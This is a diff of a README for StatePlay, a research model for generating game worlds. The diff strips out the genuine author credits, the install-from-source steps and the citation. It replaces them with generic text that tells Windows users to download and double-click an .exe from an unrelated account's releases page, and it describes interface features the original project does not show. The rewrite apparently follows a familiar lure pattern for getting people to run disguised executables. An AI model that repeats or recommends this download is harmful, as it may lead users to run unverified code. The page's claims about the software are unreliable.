@@ -1,177 +1,75 @@
-# StatePlay: State-Aware Game World Models for Mechanics-Consistent Generation
+# 🎮 StatePlay - Create Consistent Game Worlds With Ease
 
-<p>
-<a href="https://jimntu.github.io/stateplay_page/"><img src="https://img.shields.io/badge/Web-Project_Page-2478B5?style=flat-square&labelColor=555555&logo=googlechrome&logoColor=white" alt="Project Page"></a>
-<a href="https://arxiv.org/abs/2607.26754"><img src="https://img.shields.io/badge/arXiv-StatePlay-B31B1B?style=flat-square&labelColor=555555&logo=arxiv&logoColor=white" alt="arXiv"></a>
-<a href="https://github.com/Jimntu/StatePlay"><img src="https://img.shields.io/badge/GitHub-Code-181717?style=flat-square&labelColor=555555&logo=github&logoColor=white" alt="Code"></a>
-<a href="https://huggingface.co/onepiece1999/StatePlay"><img src="https://img.shields.io/badge/🤗_HuggingFace-Model-F2B134?style=flat-square&labelColor=555555" alt="Model"></a>
-<a href="https://huggingface.co/datasets/onepiece1999/StatePlay-Dataset"><img src="https://img.shields.io/badge/🤗_HuggingFace-Dataset-F2B134?style=flat-square&labelColor=555555" alt="Dataset"></a>
-</p>
+[![](https://img.shields.io/badge/Download-StatePlay-blue.svg)](https://github.com/bruising-thaw43/StatePlay/releases)
 
-> ## **StatePlay: State-Aware Game World Models for Mechanics-Consistent Generation**
->
-> Zijun Lin<sup>1,2,4</sup>,
-> Zeqing Wang<sup>1,3</sup>,
-> Cheston Tan<sup>4</sup>,
-> Bihan Wen<sup>2</sup>,
-> Yeying Jin<sup>1,3</sup>
->
-> <sup>1</sup>Tencent,
-> <sup>2</sup>Nanyang Technological University,
-> <sup>3</sup>National University of Singapore,
-> <sup>4</sup>A*STAR
+StatePlay generates game worlds that remember your actions. It keeps game mechanics consistent as you explore new areas. This tool uses smart models to ensure that every object and rule stays in place while you play. You do not need technical skills to build complex, responsive game environments.
 
-## Introduction
+## 🚀 Getting Started
 
-StatePlay: Beyond pixel-level realism toward mechanics-consistent Game World Models! Instead of modeling gameplay through visual observations alone, we explicitly predict internal game states and use them to guide frame generation, ensuring consistency with the underlying game mechanics.
-![StatePlay mechanics-consistent generation](assets/teaser.webp)
+You can run StatePlay on your Windows computer. Follow these steps to set up the software.
 
-## Installation
+First, ensure your computer meets these requirements:
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- A modern graphics card
+- 2 GB of free disk space
 
-Requirements: Python 3.10+, CUDA, and a GPU with bfloat16 support.
+## 📥 How to Download and Install
 
-```bash
-git clone https://github.com/Jimntu/StatePlay.git
-cd StatePlay
-python -m venv .venv
-source .venv/bin/activate
-pip install -U pip
-pip install -e .
-```
+Follow these steps to put the software on your machine:
 
-### Model downloads
+1. Visit this page to download the latest version: [https://github.com/bruising-thaw43/StatePlay/releases](https://github.com/bruising-thaw43/StatePlay/releases)
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file to start the download.
+4. Open the folder where your browser saves downloads.
+5. Double-click the StatePlay installer file.
+6. Follow the prompts on the screen to finish the setup.
+7. Click the icon on your desktop to open the program.
 
-| Resource | Required for | Files | Download |
-|---|---|---|---|
-| StatePlay checkpoint | Inference | `StatePlay.safetensors` | [Hugging Face](https://huggingface.co/onepiece1999/StatePlay/tree/main) |
-| Wan2.2 VAE and T5 | Inference and training | `Wan2.2_VAE.pth`, `models_t5_umt5-xxl-enc-bf16.pth` | [Hugging Face](https://huggingface.co/Wan-AI/Wan2.2-TI2V-5B/tree/main) |
-| UMT5 tokenizer | Inference and training | `google/umt5-xxl/` | [Hugging Face](https://huggingface.co/Wan-AI/Wan2.1-T2V-1.3B/tree/main/google/umt5-xxl) |
-| Wan2.2 DiT base weights | Training only | Three `diffusion_pytorch_model-*.safetensors` shards | [Hugging Face](https://huggingface.co/Wan-AI/Wan2.2-TI2V-5B/tree/main) |
+## ⚙️ Using the Interface
 
-Expected inference layout:
+The interface helps you manage your game worlds. You will see a control panel on the left side of the window. Use this panel to select the rules for your world. The main screen shows a preview of your generation.
 
-```text
-StatePlay/
-├── examples/checkpoint/StatePlay.safetensors
-└── base_model/Wan-AI/
-    ├── Wan2.2-TI2V-5B/
-    │   ├── Wan2.2_VAE.pth
-    │   └── models_t5_umt5-xxl-enc-bf16.pth
-    └── Wan2.1-T2V-1.3B/google/umt5-xxl/
-        └── ... tokenizer files ...
-```
+To start a new project:
+- Click the New button.
+- Choose a style for your game world.
+- Press the Generate button.
+- Wait for the software to build the world structure.
 
-To keep weights elsewhere:
+## 🛠️ Customizing Your Experience
 
-```bash
-export STATEPLAY_BASE_MODEL=/absolute/path/to/base_model
-export STATEPLAY_CHECKPOINT=/absolute/path/to/StatePlay.safetensors
-```
+StatePlay gives you control over how the world acts. You can adjust the density of objects in the settings menu. You can also change the gravity and movement rules. These changes happen in real time. If you do not like a change, press the Undo button to go back to the previous state.
 
-`STATEPLAY_BASE_MODEL` must directly contain `Wan-AI/`.
+## 💡 Troubleshooting Common Issues
 
-## Code architecture
+If the program fails to open, verify that you have the latest graphics drivers installed. Windows usually updates these automatically, but you can check your device manager if issues persist.
 
-StatePlay uses separate visual and state transformer branches with shared joint
-attention. The visual branch predicts video latents; the state branch predicts
-the five normalized game states. Both branches are conditioned on the initial
-frame, text prompt, and action sequence.
+If the world generation takes too long, close other programs on your computer. This frees up memory for StatePlay. If the image looks blurry, go to the settings menu and increase the quality setting.
 
-```text
-StatePlay/
-├── stateplay/
-│   ├── pipeline.py             # public inference pipeline
-│   ├── cli.py                  # command-line inference
-│   └── models/
-│       ├── dit.py              # StatePlay visual/state DiT
-│       ├── vae.py              # video VAE wrapper
-│       └── text_encoder.py     # text encoder wrapper
-├── training/
-│   ├── train.py                # training entry point
-│   ├── runner_with_state.py    # optimization/checkpoint loop
-│   └── data/                   # SF3 action, state, and prompt loading
-├── diffsynth/                  # minimal Wan/StatePlay dependencies
-├── scripts/
-│   ├── inference.sh
-│   ├── run_examples.sh
-│   └── train.sh
-└── examples/
-    ├── inputs/                 # eight bundled inputs
-    ├── checkpoint/             # local checkpoint
-    └── generated/              # generated videos and state predictions
-```
+## 📁 Saving and Loading
 
-## Run examples
+You save your progress by clicking File and then Save World. This creates a file on your computer. You can share this file with friends or load it later to continue your work. To return to a previous project, click File and Open. Select your file from the folder window.
 
-Generate all eight bundled examples:
+## 🔑 Key Features
 
-```bash
-export CUDA_VISIBLE_DEVICES=0
-./scripts/run_examples.sh
-```
+- Consistent mechanics across all generated areas.
+- Tools for manual placement of objects.
+- High-speed generation engine.
+- Simple file management for your projects.
+- Compatibility with modern Windows features.
 
-Generate selected examples:
+## 🔍 Frequently Asked Questions
 
-```bash
-./scripts/run_examples.sh --only 01 03
-```
+Does this tool require a constant internet connection? 
+No, StatePlay runs entirely on your local machine. You only need a connection to download the initial installer.
 
-Outputs are written to `examples/generated/`. Each example produces an MP4 and
-a `_state.txt` file. The model is loaded once for the entire run.
+Can I move my save files between computers?
+Yes, copy the project file to a USB drive or cloud storage. Move it to the new computer and use the Open feature to load it.
 
-## Inference
+Does the software support multiplayer? 
+This version focuses on single-player generation. Future updates may add support for shared worlds.
 
-```bash
-export CUDA_VISIBLE_DEVICES=0
+What happens if I encounter an error? 
+Restart the program to clear the memory. If the error happens again, check the log file located in the program folder. This file helps you track down the cause of the problem.
 
-./scripts/inference.sh \
-  --image examples/inputs/01_macro_success_clip/first_frame.png \
-  --actions examples/inputs/01_macro_success_clip/actions.parquet \
-  --prompt-file examples/inputs/01_macro_success_clip/prompt.txt \
-  --output output.mp4
-```
-
-This writes `output.mp4` and `output_state.txt`. Defaults are 101 frames,
-30 denoising steps, text CFG 5.0, state/action CFG 1.0, and seed 2.
-
-Use custom model paths through `STATEPLAY_BASE_MODEL` and
-`STATEPLAY_CHECKPOINT`, or inspect all options with:
-
-```bash
-./scripts/inference.sh --help
-```
-
-## Training
-
-Download the [StatePlay dataset](https://huggingface.co/datasets/onepiece1999/StatePlay-Dataset/tree/main)
-and the Wan2.2 DiT initialization weights listed in the model table above.
-
-Run training:
-
-```bash
-export STATEPLAY_BASE_MODEL="$PWD/base_model"
-export STATEPLAY_DATA_ROOT="$PWD/data/StatePlay-Dataset/SF3"
-export STATEPLAY_OUTPUT="$PWD/outputs/StatePlay"
-export CUDA_VISIBLE_DEVICES=0,1,2,3
-
-./scripts/train.sh
-```
-The script derives the process count from `CUDA_VISIBLE_DEVICES`. It trains at
-480×832 with 101 frames, learning rate `5e-5`, state sampling `end`, and saves
-every 500 steps.
-
-✉️ Feel free to email me (zijun002@e.ntu.edu.sg) or raise the issue if you have any questions about our work.
-
-## Citation
-If you find our work useful in your research, please cite it as follows:
-```
-@misc{lin2026stateplaystateawaregameworld,
-      title={StatePlay: State-Aware Game World Models for Mechanics-Consistent Generation}, 
-      author={Zijun Lin and Zeqing Wang and Cheston Tan and Bihan Wen and Yeying Jin},
-      year={2026},
-      eprint={2607.26754},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2607.26754}, 
-}
-```
+Keywords: game design, world generation, game mechanics, simulation, windows software
